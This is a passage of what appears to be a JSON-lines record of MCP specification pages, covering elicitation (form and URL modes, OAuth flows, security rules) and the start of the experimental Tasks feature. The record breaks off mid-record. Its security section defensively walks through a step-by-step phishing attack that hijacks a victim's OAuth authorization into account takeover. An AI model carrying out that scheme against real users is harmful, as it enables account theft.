```\n\n   Multi-select enum (with titles):\n\n   ```json\n   {\n     \"type\": \"array\",\n     \"title\": \"Color Selection\",\n     \"description\": \"Choose your favorite colors\",\n     \"minItems\": 1,\n     \"maxItems\": 2,\n     \"items\": {\n       \"anyOf\": [\n         { \"const\": \"#FF0000\", \"title\": \"Red\" },\n         { \"const\": \"#00FF00\", \"title\": \"Green\" },\n         { \"const\": \"#0000FF\", \"title\": \"Blue\" }\n       ]\n     },\n     \"default\": [\"#FF0000\", \"#00FF00\"]\n   }\n   ```\n\nClients can use this schema to:\n\n1. Generate appropriate input forms\n2. Validate user input before sending\n3. Provide better guidance to users\n\nAll primitive types support optional default values to provide sensible starting points. Clients that support defaults SHOULD pre-populate form fields with these values.\n\nNote that complex nested structures, arrays of objects (beyond enums), and other advanced JSON Schema features are intentionally not supported to simplify client user experience.\n\n#### Example: Simple Text Request\n\n**Request:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 1,\n  \"method\": \"elicitation/create\",\n  \"params\": {\n    \"mode\": \"form\",\n    \"message\": \"Please provide your GitHub username\",\n    \"requestedSchema\": {\n      \"type\": \"object\",\n      \"properties\": {\n        \"name\": {\n          \"type\": \"string\"\n        }\n      },\n      \"required\": [\"name\"]\n    }\n  }\n}\n```\n\n**Response:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 1,\n  \"result\": {\n    \"action\": \"accept\",\n    \"content\": {\n      \"name\": \"octocat\"\n    }\n  }\n}\n```\n\n#### Example: Structured Data Request\n\n**Request:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 2,\n  \"method\": \"elicitation/create\",\n  \"params\": {\n    \"mode\": \"form\",\n    \"message\": \"Please provide your contact information\",\n    \"requestedSchema\": {\n      \"type\": \"object\",\n      \"properties\": {\n        \"name\": {\n          \"type\": \"string\",\n          \"description\": \"Your full name\"\n        },\n        \"email\": {\n          \"type\": \"string\",\n          \"format\": \"email\",\n          \"description\": \"Your email address\"\n        },\n        \"age\": {\n          \"type\": \"number\",\n          \"minimum\": 18,\n          \"description\": \"Your age\"\n        }\n      },\n      \"required\": [\"name\", \"email\"]\n    }\n  }\n}\n```\n\n**Response:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 2,\n  \"result\": {\n    \"action\": \"accept\",\n    \"content\": {\n      \"name\": \"Monalisa Octocat\",\n      \"email\": \"octocat@github.com\",\n      \"age\": 30\n    }\n  }\n}\n```\n\n### URL Mode Elicitation Requests\n\n<Note>\n\n**New feature:** URL mode elicitation is introduced in the `2025-11-25` version of the MCP specification. Its design and implementation may change in future protocol revisions.\n\n</Note>\n\nURL mode elicitation enables servers to direct users to external URLs for out-of-band interactions that must not pass through the MCP client. This is essential for auth flows, payment processing, and other sensitive or secure operations.\n\nURL mode elicitation requests **MUST** specify `mode: \"url\"`, a `message`, and include these additional parameters:\n\n| Name            | Type   | Description                               |\n| --------------- | ------ | ----------------------------------------- |\n| `url`           | string | The URL that the user should navigate to. |\n| `elicitationId` | string | A unique identifier for the elicitation.  |\n\nThe `url` parameter **MUST** contain a valid URL.\n\n<Note>\n  **Important**: URL mode elicitation is *not* for authorizing the MCP client's\n  access to the MCP server (that's handled by [MCP\n  authorization](../basic/authorization)). Instead, it's used when the MCP\n  server needs to obtain sensitive information or third-party authorization on\n  behalf of the user. The MCP client's bearer token remains unchanged. The\n  client's only responsibility is to provide the user with context about the\n  elicitation URL the server wants them to open.\n</Note>\n\n#### Example: Request Sensitive Data\n\nThis example shows a URL mode elicitation request directing the user to a secure URL where they can provide sensitive information (an API key, for example).\nThe same request could direct the user into an OAuth authorization flow, or a payment flow. The only difference is the URL and the message.\n\n**Request:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 3,\n  \"method\": \"elicitation/create\",\n  \"params\": {\n    \"mode\": \"url\",\n    \"elicitationId\": \"550e8400-e29b-41d4-a716-446655440000\",\n    \"url\": \"https://mcp.example.com/ui/set_api_key\",\n    \"message\": \"Please provide your API key to continue.\"\n  }\n}\n```\n\n**Response:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 3,\n  \"result\": {\n    \"action\": \"accept\"\n  }\n}\n```\n\nThe response with `action: \"accept\"` indicates that the user has consented to the\ninteraction. It does not mean that the interaction is complete. The interaction occurs out\nof band and the client is not aware of the outcome until and unless the server sends a notification indicating completion.\n\n### Completion Notifications for URL Mode Elicitation\n\nServers **MAY** send a `notifications/elicitation/complete` notification when an\nout-of-band interaction started by URL mode elicitation is completed. This allows clients to react programmatically if appropriate.\n\nServers sending notifications:\n\n- **MUST** only send the notification to the client that initiated the elicitation request.\n- **MUST** include the `elicitationId` established in the original `elicitation/create` request.\n\nClients:\n\n- **MUST** ignore notifications referencing unknown or already-completed IDs.\n- **MAY** wait for this notification to automatically retry requests that received a [URLElicitationRequiredError](#error-handling), update the user interface, or otherwise continue an interaction.\n- **SHOULD** still provide manual controls that let the user retry or cancel the original request (or otherwise resume interacting with the client) if the notification never arrives.\n\n#### Example\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"method\": \"notifications/elicitation/complete\",\n  \"params\": {\n    \"elicitationId\": \"550e8400-e29b-41d4-a716-446655440000\"\n  }\n}\n```\n\n### URL Elicitation Required Error\n\nWhen a request cannot be processed until an elicitation is completed, the server **MAY** return a [`URLElicitationRequiredError`](#error-handling) (code `-32042`) to indicate to the client that a URL mode elicitation is required. The server **MUST NOT** return this error except when URL mode elicitation is required.\n\nThe error **MUST** include a list of elicitations that are required to complete before the original can be retried.\n\nAny elicitations returned in the error **MUST** be URL mode elicitations and have an `elicitationId` property.\n\n**Error Response:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 2,\n  \"error\": {\n    \"code\": -32042, // URL_ELICITATION_REQUIRED\n    \"message\": \"This request requires more information.\",\n    \"data\": {\n      \"elicitations\": [\n        {\n          \"mode\": \"url\",\n          \"elicitationId\": \"550e8400-e29b-41d4-a716-446655440000\",\n          \"url\": \"https://mcp.example.com/connect?elicitationId=550e8400-e29b-41d4-a716-446655440000\",\n          \"message\": \"Authorization is required to access your Example Co files.\"\n        }\n      ]\n    }\n  }\n}\n```\n\n## Message Flow\n\n### Form Mode Flow\n\n```mermaid\nsequenceDiagram\n    participant User\n    participant Client\n    participant Server\n\n    Note over Server: Server initiates elicitation\n    Server->>Client: elicitation/create (mode: form)\n\n    Note over User,Client: Present elicitation UI\n    User-->>Client: Provide requested information\n\n    Note over Server,Client: Complete request\n    Client->>Server: Return user response\n\n    Note over Server: Continue processing with new information\n```\n\n### URL Mode Flow\n\n```mermaid\nsequenceDiagram\n    participant UserAgent as User Agent (Browser)\n    participant User\n    participant Client\n    participant Server\n\n    Note over Server: Server initiates elicitation\n    Server->>Client: elicitation/create (mode: url)\n\n    Client->>User: Present consent to open URL\n    User-->>Client: Provide consent\n\n    Client->>UserAgent: Open URL\n    Client->>Server: Accept response\n\n    Note over User,UserAgent: User interaction\n    UserAgent-->>Server: Interaction complete\n    Server-->>Client: notifications/elicitation/complete (optional)\n\n    Note over Server: Continue processing with new information\n```\n\n### URL Mode With Elicitation Required Error Flow\n\n```mermaid\nsequenceDiagram\n    participant UserAgent as User Agent (Browser)\n    participant User\n    participant Client\n    participant Server\n\n    Client->>Server: tools/call\n\n    Note over Server: Server needs authorization\n    Server->>Client: URLElicitationRequiredError\n    Note over Client: Client notes the original request can be retried after elicitation\n\n    Client->>User: Present consent to open URL\n    User-->>Client: Provide consent\n\n    Client->>UserAgent: Open URL\n\n    Note over User,UserAgent: User interaction\n\n    UserAgent-->>Server: Interaction complete\n    Server-->>Client: notifications/elicitation/complete (optional)\n\n    Client->>Server: Retry tools/call (optional)\n```\n\n## Response Actions\n\nElicitation responses use a three-action model to clearly distinguish between different user actions. These actions apply to both form and URL elicitation modes.\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 1,\n  \"result\": {\n    \"action\": \"accept\", // or \"decline\" or \"cancel\"\n    \"content\": {\n      \"propertyName\": \"value\",\n      \"anotherProperty\": 42\n    }\n  }\n}\n```\n\nThe three response actions are:\n\n1. **Accept** (`action: \"accept\"`): User explicitly approved and submitted with data\n   - For form mode: The `content` field contains the submitted data matching the requested schema\n   - For URL mode: The `content` field is omitted\n   - Example: User clicked \"Submit\", \"OK\", \"Confirm\", etc.\n\n2. **Decline** (`action: \"decline\"`): User explicitly declined the request\n   - The `content` field is typically omitted\n   - Example: User clicked \"Reject\", \"Decline\", \"No\", etc.\n\n3. **Cancel** (`action: \"cancel\"`): User dismissed without making an explicit choice\n   - The `content` field is typically omitted\n   - Example: User closed the dialog, clicked outside, pressed Escape, browser failed to load, etc.\n\nServers should handle each state appropriately:\n\n- **Accept**: Process the submitted data\n- **Decline**: Handle explicit decline (e.g., offer alternatives)\n- **Cancel**: Handle dismissal (e.g., prompt again later)\n\n## Implementation Considerations\n\n### Statefulness\n\nMost practical uses of elicitation require that the server maintain state about users:\n\n- Whether required information has been collected (e.g., the user's display name via form mode elicitation)\n- Status of resource access (e.g., API keys or a payment flow via URL mode elicitation)\n\nServers implementing elicitation **MUST** securely associate this state with individual users following the guidelines in the [security best practices](../basic/security_best_practices) document. Specifically:\n\n- State **MUST NOT** be associated with session IDs alone\n- State storage **MUST** be protected against unauthorized access\n- For remote MCP servers, user identification **MUST** be derived from credentials acquired via [MCP authorization](../basic/authorization) when possible (e.g. `sub` claim)\n\n<Note>\n  The examples in this section are non-normative and illustrate potential uses\n  of elicitation. Implementers should adapt these patterns to their specific\n  requirements while maintaining security best practices.\n</Note>\n\n### URL Mode Elicitation for Sensitive Data\n\nFor servers that interact with external APIs requiring sensitive information (e.g., credentials, payment information), URL mode elicitation provides a secure mechanism for users to provide this information without exposing it to the MCP client.\n\nIn this pattern:\n\n1. The server directs users to a secure web page (served over HTTPS)\n2. The page presents a branded form UI on a domain the user trusts\n3. Users enter sensitive credentials directly into the secure form\n4. The server stores credentials securely, bound to the user's identity\n5. Subsequent MCP requests use these stored credentials for API access\n\nThis approach ensures that sensitive credentials never pass through the LLM context, MCP client or any intermediate MCP servers, reducing the risk of exposure through client-side logging or other attack vectors.\n\n### URL Mode Elicitation for OAuth Flows\n\nURL mode elicitation enables a pattern where MCP servers act as OAuth clients to third-party resource servers.\nAuthorization with external APIs enabled by URL mode elicitation is separate from [MCP authorization](../basic/authorization). MCP servers **MUST NOT** rely on URL mode elicitation to authorize users for themselves.\n\n#### Understanding the Distinction\n\n- **MCP Authorization**: Required OAuth flow between the MCP client and MCP server (covered in the [authorization specification](../basic/authorization))\n- **External (third-party) Authorization**: Optional authorization between the MCP server and a third-party resource server, initiated via URL mode elicitation\n\nIn external authorization, the server acts as both:\n\n- An OAuth resource server (to the MCP client)\n- An OAuth client (to the third-party resource server)\n\nExample scenario:\n\n- An MCP client connects to an MCP server\n- The MCP server integrates with various different third-party services\n- When the MCP client calls a tool that requires access to a third-party service, the MCP server needs credentials for that service\n\nThe critical security requirements are:\n\n1. **The third-party credentials MUST NOT transit through the MCP client**: The client must never see third-party credentials to protect the security boundary\n2. **The MCP server MUST NOT use the client's credentials for the third-party service**: That would be [token passthrough](../basic/security_best_practices#token-passthrough), which is forbidden\n3. **The user MUST authorize the MCP server directly**: The interaction happens outside the MCP protocol, without involving the MCP client\n4. **The MCP server is responsible for tokens**: The MCP server is responsible for storing and managing the third-party tokens obtained through the URL mode elicitation (in other words, the MCP server must be stateful).\n\nCredentials obtained via URL mode elicitation are distinct from the MCP server credentials used by the MCP client. The MCP server **MUST NOT** transmit credentials obtained through URL mode elicitation to the MCP client.\n\n<Note>\n  For additional background, refer to the [token passthrough\n  section](../basic/security_best_practices#token-passthrough) of the Security\n  Best Practices document to understand why MCP servers cannot act as\n  pass-through proxies.\n</Note>\n\n#### Implementation Pattern\n\nWhen implementing external authorization via URL mode elicitation:\n\n1. The MCP server generates an authorization URL, acting as an OAuth client to the third-party service\n2. The MCP server stores internal state that associates (binds) the elicitation request with the user's identity.\n3. The MCP server sends a URL mode elicitation request to the client with a URL that can start the authorization flow.\n4. The user completes the OAuth flow directly with the third-party authorization server\n5. The third-party authorization server redirects back to the MCP server\n6. The MCP server securely stores the third-party tokens, bound to the user's identity\n7. Future MCP requests can leverage these stored tokens for API access to the third-party resource server\n\nThe following is a non-normative example of how this pattern could be implemented:\n\n```mermaid\nsequenceDiagram\n    participant User\n    participant UserAgent as User Agent (Browser)\n    participant 3AS as 3rd Party AS\n    participant 3RS as 3rd Party RS\n    participant Client as MCP Client\n    participant Server as MCP Server\n\n    Client->>Server: tools/call\n    Note over Server: Needs 3rd-party authorization for user\n    Note over Server: Store state (bind the elicitation request to the user)\n    Server->>Client: URLElicitationRequiredError<br> (mode: \"url\", url: \"https://mcp.example.com/connect?...\")\n    Note over Client: Client notes the tools/call request can be retried later\n    Client->>User: Present consent to open URL\n    User->>Client: Provide consent\n    Client->>UserAgent: Open URL\n    Client->>Server: Accept response\n    UserAgent->>Server: Load connect route\n    Note over Server: Confirm: user is logged into MCP Server or MCP AS<br>Confirm: elicitation user matches session user\n    Server->>UserAgent: Redirect to third-party authorization endpoint\n    UserAgent->>3AS: Load authorize route\n    Note over 3AS,User: User interaction (OAuth flow):<br>User consents to scoped MCP Server access\n    3AS->>UserAgent: redirect to MCP Server's redirect_uri\n    UserAgent->>Server: load redirect_uri page\n    Note over Server: Confirm: redirect_uri belongs to MCP Server\n    Server->>3AS: Exchange authorization code for  OAuth tokens\n    3AS->>Server: Grants tokens\n    Note over Server: Bind tokens to MCP user identity\n    Server-->>Client: notifications/elicitation/complete (optional)\n    Client->>Server: Retry tools/call\n    Note over Server: Retrieve token bound to user identity\n    Server->>3RS: Call 3rd-party API\n```\n\nThis pattern maintains clear security boundaries while enabling rich integrations with third-party services that require user authorization.\n\n## Error Handling\n\nServers **MUST** return standard JSON-RPC errors for common failure cases:\n\n- When a request cannot be processed until an elicitation is completed: `-32042` (`URLElicitationRequiredError`)\n\nClients **MUST** return standard JSON-RPC errors for common failure cases:\n\n- Server sends an `elicitation/create` request with a mode not declared in client capabilities: `-32602` (Invalid params)\n\n## Security Considerations\n\n1. Servers **MUST** bind elicitation requests to the client and user identity\n1. Clients **MUST** provide clear indication of which server is requesting information\n1. Clients **SHOULD** implement user approval controls\n1. Clients **SHOULD** allow users to decline elicitation requests at any time\n1. Clients **SHOULD** implement rate limiting\n1. Clients **SHOULD** present elicitation requests in a way that makes it clear what information is being requested and why\n\n### Safe URL Handling\n\nMCP servers requesting elicitation:\n\n1. **MUST NOT** include sensitive information about the end-user, including credentials, personal identifiable information, etc., in the URL sent to the client in a URL elicitation request.\n2. **MUST NOT** provide a URL which is pre-authenticated to access a protected resource, as the URL could be used to impersonate the user by a malicious client.\n3. **SHOULD NOT** include URLs intended to be clickable in any field of a form mode elicitation request.\n4. **SHOULD** use HTTPS URLs for non-development environments.\n\nThese server requirements ensure that client implementations have clear rules about when to present a URL to the user, so that the client-side rules (below) can be consistently applied.\n\nClients implementing URL mode elicitation **MUST** handle URLs carefully to prevent users from unknowingly clicking malicious links.\n\nWhen handling URL mode elicitation requests, MCP clients:\n\n1. **MUST NOT** automatically pre-fetch the URL or any of its metadata.\n2. **MUST NOT** open the URL without explicit consent from the user.\n3. **MUST** show the full URL to the user for examination before consent.\n4. **MUST** open the URL provided by the server in a secure manner that does not enable the client or LLM to inspect the content or user inputs.\n   For example, on iOS, [SFSafariViewController](https://developer.apple.com/documentation/safariservices/sfsafariviewcontroller) is good, but [WkWebView](https://developer.apple.com/documentation/webkit/wkwebview) is not.\n5. **SHOULD** highlight the domain of the URL to mitigate subdomain spoofing.\n6. **SHOULD** have warnings for ambiguous/suspicious URIs (i.e., containing Punycode).\n7. **SHOULD NOT** render URLs as clickable in any field of an elicitation request, except for the `url` field in a URL elicitation request (with the restrictions detailed above).\n\n### Identifying the User\n\nServers **MUST NOT** rely on client-provided user identification without server verification, as this can be forged.\nInstead, servers **SHOULD** follow [security best practices](../basic/security_best_practices).\n\nNon-normative examples:\n\n- Incorrect: Treat user input like \"I am joe@example.com\" as authoritative\n- Correct: Rely on [authorization](../basic/authorization) to identify the user\n\n### Form Mode Security\n\n1. Servers **MUST NOT** request sensitive information (passwords, API keys, etc.) via form mode\n2. Clients **SHOULD** validate all responses against the provided schema\n3. Servers **SHOULD** validate received data matches the requested schema\n\n#### Phishing\n\nURL mode elicitation returns a URL that an attacker can use to send to a victim. The MCP Server **MUST** verify the identity of the user who opens the URL before accepting information.\n\nTypically identity verification is done by leveraging the [MCP authorization server](../basic/authorization) to identify the user, through a session cookie or equivalent in the browser.\n\nFor example, URL mode elicitation may be used to perform OAuth flows where the server acts as an OAuth client of another resource server. Without proper mitigation, the following phishing attack is possible:\n\n1. A malicious user (Alice) connected to a benign server triggers an elicitation request\n2. The benign server generates an authorization URL, acting as an OAuth client of a third-party authorization server\n3. Alice's client displays the URL and asks for consent\n4. Instead of clicking on the link, Alice tricks a victim user (Bob) of the same benign server into clicking it\n5. Bob opens the link and completes the authorization, thinking they are authorizing their own connection to the benign server\n6. The benign server receives a callback/redirect form the third-party authorization server, and assumes it's Alice's request\n7. The tokens for the third-party server are bound to Alice's session and identity, instead of Bob's, resulting in an account takeover\n\nTo prevent this attack, the server **MUST** ensure that the user who started the elicitation request (the end-user who is accessing the server via the MCP client) is the same user who completes the authorization flow.\n\nThere are many ways to achieve this and the best way will depend on the specific implementation.\n\nAs a common, non-normative example, consider a case where the MCP server is accessible via the web and desires to perform a third-party authorization code flow.\nTo prevent the phishing attack, the server would create a URL mode elicitation to `https://mcp.example.com/connect?elicitationId=...` rather than the third-party authorization endpoint.\nThis \"connect URL\" must ensure the user who opened the page is the same user who the elicitation was generated for.\nIt would, for example, check that the user has a valid session cookie and that the session cookie is for the same user who was using the MCP client to generate the URL mode elicitation.\nThis could be done by comparing the authoritative subject (`sub` claim) from the MCP server's authorization server to the subject from the session cookie.\nOnce that page ensures the same user, it can send the user to the third-party authorization server at `https://example.com/authorize?...` where a normal OAuth flow can be completed.\n\nIn other cases, the server may not be accessible via the web and may not be able to use a session cookie to identify the user.\nIn this case, the server must use a different mechanism to identify the user who opens the elicitation URL is the same user who the elicitation was generated for.\n\nIn all implementations, the server **MUST** ensure that the mechanism to determine the user's identity is resilient to attacks where an attacker can modify the elicitation URL.\n"}
{"source":"github","repo":"mcp-spec","path":"docs/specification/draft/basic/utilities/tasks.mdx","content":"---\ntitle: Tasks\n---\n\n<div id=\"enable-section-numbers\" />\n\n<Info>**Protocol Revision**: draft</Info>\n\n<Note>\n\nTasks were introduced in version 2025-11-25 of the MCP specification and are currently considered **experimental**.\nThe design and behavior of tasks may evolve in future protocol versions.\n\n</Note>\n\nThe Model Context Protocol (MCP) allows requestors — which can be either clients or servers, depending on the direction of communication — to augment their requests with **tasks**. Tasks are durable state machines that carry information about the underlying execution state of the request they wrap, and are intended for requestor polling and deferred result retrieval. Each task is uniquely identifiable by a receiver-generated **task ID**.\n\nTasks are useful for representing expensive computations and batch processing requests, and integrate seamlessly with external job APIs.\n\n## Definitions\n\nTasks represent parties as either \"requestors\" or \"receivers,\" defined as follows:\n\n- **Requestor:** The sender of a task-augmented request. This can be the client or the server — either can create tasks.\n- **Receiver:** The receiver of a task-augmented request, and the entity executing the task. This can be the client or the server — either can receive and execute tasks.\n\n## User Interaction Model\n\nTasks are designed to be **requestor-driven** - requestors are responsible for augmenting requests with tasks and for polling for the results of those tasks; meanwhile, receivers tightly control which requests (if any) support task-based execution and manages the lifecycles of those tasks.\n\nThis requestor-driven approach ensures deterministic response handling and enables sophisticated patterns such as dispatching concurrent requests, which only the requestor has sufficient context to orchestrate.\n\nImplementations are free to expose tasks through any interface pattern that suits their needs — the protocol itself does not mandate any specific user interaction model.\n\n## Capabilities\n\nServers and clients that support task-augmented requests **MUST** declare a `tasks` capability during initialization. The `tasks` capability is structured by request category, with boolean properties indicating which specific request types support task augmentation.\n\n### Server Capabilities\n\nServers declare if they support tasks, and if so, which server-side requests can be augmented with tasks.\n\n| Capability                  | Description                                          |\n| --------------------------- | ---------------------------------------------------- |\n| `tasks.list`                | Server supports the `tasks/list` operation           |\n| `tasks.cancel`              | Server supports the `tasks/cancel` operation         |\n| `tasks.requests.tools.call` | Server supports task-augmented `tools/call` requests |\n\n```json\n{\n  \"capabilities\": {\n    \"tasks\": {\n      \"list\": {},\n      \"cancel\": {},\n      \"requests\": {\n        \"tools\": {\n          \"call\": {}\n        }\n      }\n    }\n  }\n}\n```\n\n### Client Capabilities\n\nClients declare if they support tasks, and if so, which client-side requests can be augmented with tasks.\n\n| Capability                              | Description                                                      |\n| --------------------------------------- | ---------------------------------------------------------------- |\n| `tasks.list`                            | Client supports the `tasks/list` operation                       |\n| `tasks.cancel`                          | Client supports the `tasks/cancel` operation                     |\n| `tasks.requests.sampling.createMessage` | Client supports task-augmented `sampling/createMessage` requests |\n| `tasks.requests.elicitation.create`     | Client supports task-augmented `elicitation/create` requests     |\n\n```json\n{\n  \"capabilities\": {\n    \"tasks\": {\n      \"list\": {},\n      \"cancel\": {},\n      \"requests\": {\n        \"sampling\": {\n          \"createMessage\": {}\n        },\n        \"elicitation\": {\n          \"create\": {}\n        }\n      }\n    }\n  }\n}\n```\n\n### Capability Negotiation\n\nDuring the initialization phase, both parties exchange their `tasks` capabilities to establish which operations support task-based execution. Requestors **SHOULD** only augment requests with a task if the corresponding capability has been declared by the receiver.\n\nFor example, if a server's capabilities include `tasks.requests.tools.call: {}`, then clients may augment `tools/call` requests with a task. If a client's capabilities include `tasks.requests.sampling.createMessage: {}`, then servers may augment `sampling/createMessage` requests with a task.\n\nIf `capabilities.tasks` is not defined, the peer **SHOULD NOT** attempt to create tasks during requests.\n\nThe set of capabilities in `capabilities.tasks.requests` is exhaustive. If a request type is not present, it does not support task-augmentation.\n\n`capabilities.tasks.list` controls if the `tasks/list` operation is supported by the party.\n\n`capabilities.tasks.cancel` controls if the `tasks/cancel` operation is supported by the party.\n\n### Tool-Level Negotiation\n\nTool calls are given special consideration for the purpose of task augmentation. In the result of `tools/list`, tools declare support for tasks via `execution.taskSupport`, which if present can have a value of `\"required\"`, `\"optional\"`, or `\"forbidden\"`.\n\nThis is to be interpreted as a fine-grained layer in addition to capabilities, following these rules:\n\n1. If a server's capabilities do not include `tasks.requests.tools.call`, then clients **MUST NOT** attempt to use task augmentation on that server's tools, regardless of the `execution.taskSupport` value.\n1. If a server's capabilities include `tasks.requests.tools.call`, then clients consider the value of `execution.taskSupport`, and handle it accordingly:\n   1. If `execution.taskSupport` is not present or `\"forbidden\"`, clients **MUST NOT** attempt to invoke the tool as a task. Servers **SHOULD** return a `-32601` (Method not found) error if a client attempts to do so. This is the default behavior.\n   1. If `execution.taskSupport` is `\"optional\"`, clients **MAY** invoke the tool as a task or as a normal request.\n   1. If `execution.taskSupport` is `\"required\"`, clients **MUST** invoke the tool as a task. Servers **MUST** return a `-32601` (Method not found) error if a client does not attempt to do so.\n\n## Protocol Messages\n\n### Creating Tasks\n\nTask-augmented requests follow a two-phase response pattern that differs from normal requests:\n\n- **Normal requests**: The server processes the request and returns the actual operation result directly.\n- **Task-augmented requests**: The server accepts the request and immediately returns a `CreateTaskResult` containing task data. The actual operation result becomes available later through `tasks/result` after the task completes.\n\nTo create a task, requestors send a request with the `task` field included in the request params. Requestors **MAY** include a `ttl` value indicating the desired task lifetime duration (in milliseconds) since its creation.\n\n**Request:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 1,\n  \"method\": \"tools/call\",\n  \"params\": {\n    \"name\": \"get_weather\",\n    \"arguments\": {\n      \"city\": \"New York\"\n    },\n    \"task\": {\n      \"ttl\": 60000\n    }\n  }\n}\n```\n\n**Response:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 1,\n  \"result\": {\n    \"task\": {\n      \"taskId\": \"786512e2-9e0d-44bd-8f29-789f320fe840\",\n      \"status\": \"working\",\n      \"statusMessage\": \"The operation is now in progress.\",\n      \"createdAt\": \"2025-11-25T10:30:00Z\",\n      \"lastUpdatedAt\": \"2025-11-25T10:40:00Z\",\n      \"ttl\": 60000,\n      \"pollInterval\": 5000\n    }\n  }\n}\n```\n\nWhen a receiver accepts a task-augmented request, it returns a [`CreateTaskResult`](/specification/draft/schema#createtaskresult) containing task data. The response does not include the actual operation result. The actual result (e.g., tool result for `tools/call`) becomes available only through `tasks/result` after the task completes.\n\n<Note>\n\nWhen a task is created in response to a `tools/call` request, host applications may wish to return control to the model while the task is executing. This allows the model to continue processing other requests or perform additional work while waiting for the task to complete.\n\nTo support this pattern, servers can provide an optional `io.modelcontextprotocol/model-immediate-response` key in the `_meta` field of the `CreateTaskResult`. The value of this key should be a string intended to be passed as an immediate tool result to the model.\nIf a server does not provide this field, the host application can fall back to its own predefined message.\n\nThis guidance is non-binding and is provisional logic intended to account for the specific use case. This behavior may be formalized or modified as part of `CreateTaskResult` in future protocol versions.\n\n</Note>\n\n### Getting Tasks\n\n<Note>\n\nIn the Streamable HTTP (SSE) transport, clients **MAY** disconnect from an SSE stream opened by the server in response to a `tasks/get` request at any time.\n\nWhile this note is not prescriptive regarding the specific usage of SSE streams, all implementations **MUST** continue to comply with the existing [Streamable HTTP transport specification](../transports#sending-messages-to-the-server).\n\n</Note>\n\nRequestors poll for task completion by sending [`tasks/get`](/specification/draft/schema#tasks%2Fget) requests.\nRequestors **SHOULD** respect the `pollInterval` provided in responses when determining polling frequency.\n\nRequestors **SHOULD** continue polling until the task reaches a terminal status (`completed`, `failed`, or `cancelled`), or until encountering the [`input_required`](#input-required-status) status. Note that invoking `tasks/result` does not imply that the requestor needs to stop polling - requestors **SHOULD** continue polling the task status via `tasks/get` if they are not actively waiting for `tasks/result` to complete.\n\n**Request:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 3,\n  \"method\": \"tasks/get\",\n  \"params\": {\n    \"taskId\": \"786512e2-9e0d-44bd-8f29-789f320fe840\"\n  }\n}\n```\n\n**Response:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 3,\n  \"result\": {\n    \"taskId\": \"786512e2-9e0d-44bd-8f29-789f320fe840\",\n    \"status\": \"working\",\n    \"statusMessage\": \"The operation is now in progress.\",\n    \"createdAt\": \"2025-11-25T10:30:00Z\",\n    \"lastUpdatedAt\": \"2025-11-25T10:40:00Z\",\n    \"ttl\": 30000,\n    \"pollInterval\": 5000\n  }\n}\n```\n\n### Retrieving Task Results\n\n<Note>\n\nIn the Streamable HTTP (SSE) transport, clients **MAY** disconnect from an SSE stream opened by the server in response to a `tasks/result` request at any time.\n\nWhile this note is not prescriptive regarding the specific usage of SSE streams, all implementations **MUST** continue to comply with the existing [Streamable HTTP transport specification](../transports#sending-messages-to-the-server).\n\n</Note>\n\nAfter a task completes the operation result is retrieved via [`tasks/result`](/specification/draft/schema#tasks%2Fresult). This is distinct from the initial `CreateTaskResult` response, which contains only task data. The result structure matches the original request type (e.g., `CallToolResult` for `tools/call`).\n\nTo retrieve the result of a completed task, requestors can send a `tasks/result` request:\n\nWhile `tasks/result` blocks until the task reaches a terminal status, requestors can continue polling via `tasks/get` in parallel if they are not actively blocked waiting for the result, such as if their previous `tasks/result` request failed or was cancelled. This allows requestors to monitor status changes or display progress updates while the task executes, even after invoking `tasks/result`.\n\n**Request:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 4,\n  \"method\": \"tasks/result\",\n  \"params\": {\n    \"taskId\": \"786512e2-9e0d-44bd-8f29-789f320fe840\"\n  }\n}\n```\n\n**Response:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 4,\n  \"result\": {\n    \"content\": [\n      {\n        \"type\": \"text\",\n        \"text\": \"Current weather in New York:\\nTemperature: 72°F\\nConditions: Partly cloudy\"\n      }\n    ],\n    \"isError\": false,\n    \"_meta\": {\n      \"io.modelcontextprotocol/related-task\": {\n        \"taskId\": \"786512e2-9e0d-44bd-8f29-789f320fe840\"\n      }\n    }\n  }\n}\n```\n\n### Task Status Notification\n\nWhen a task status changes, receivers **MAY** send a [`notifications/tasks/status`](/specification/draft/schema#notifications%2Ftasks%2Fstatus) notification to inform the requestor of the change. This notification includes the full task state.\n\n**Notification:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"method\": \"notifications/tasks/status\",\n  \"params\": {\n    \"taskId\": \"786512e2-9e0d-44bd-8f29-789f320fe840\",\n    \"status\": \"completed\",\n    \"createdAt\": \"2025-11-25T10:30:00Z\",\n    \"lastUpdatedAt\": \"2025-11-25T10:50:00Z\",\n    \"ttl\": 60000,\n    \"pollInterval\": 5000\n  }\n}\n```\n\nThe notification includes the full [`Task`](/specification/draft/schema#task) object, including the updated `status` and `statusMessage` (if present). This allows requestors to access the complete task state without making an additional `tasks/get` request.\n\nRequestors **MUST NOT** rely on receiving this notifications, as it is optional. Receivers are not required to send status notifications and may choose to only send them for certain status transitions. Requestors **SHOULD** continue to poll via `tasks/get` to ensure they receive status updates.\n\n### Listing Tasks\n\nTo retrieve a list of tasks, requestors can send a [`tasks/list`](/specification/draft/schema#tasks%2Flist) request. This operation supports pagination.\n\n**Request:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 5,\n  \"method\": \"tasks/list\",\n  \"params\": {\n    \"cursor\": \"optional-cursor-value\"\n  }\n}\n```\n\n**Response:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 5,\n  \"result\": {\n    \"tasks\": [\n      {\n        \"taskId\": \"786512e2-9e0d-44bd-8f29-789f320fe840\",\n        